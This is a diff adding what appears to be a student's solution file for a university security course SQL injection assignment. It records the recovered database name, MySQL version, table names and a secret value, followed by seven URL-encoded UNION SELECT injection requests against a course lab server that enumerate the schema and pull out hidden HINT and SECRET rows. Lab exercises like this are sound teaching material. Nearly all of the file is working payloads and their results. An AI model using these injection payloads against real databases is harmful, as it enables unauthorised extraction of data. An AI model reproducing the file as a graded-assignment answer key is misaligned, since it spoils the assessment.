@@ -1,0 +1,12 @@
+proj2_inject3
+5.5.60-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+maxiallary
+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database%28%29%2C+3%2C+database%28%29%3B--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+database%28%29%2C+3%2C+version%28%29%3B--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+group_concat%28table_name+separator+%27%2C+%27%29%2C+3%2C+4+from+information_schema+.tables+where+table_schema%3D%27proj2_inject3%27+group+by+table_schema%3B--+%27
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+2%2C+3%2C+group_concat%28column_name+separator+%27%2C+%27%29+from+information_schema+.columns+where+table_schema+%3D+%27proj2_inject3%27+and+table_name+%3D+%27SECRET%27+group+by+table_schema%2C+table_name%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+2%2C+3%2C+group_concat%28column_name+separator+%27%2C+%27%29+from+information_schema+.columns+where+table_schema+%3D+%27proj2_inject3%27+and+table_name+%3D+%27HINT%27+group+by+table_schema%2C+table_name%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C2%2C3%2C+message+from+HINT%3B+--+
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=%27+union+select+1%2C+id%2C+3%2C+secret+from+SECRET+where+hash+%3D+%270a3953145218d820332443a6c6f9b8f1%27+%3B+--+
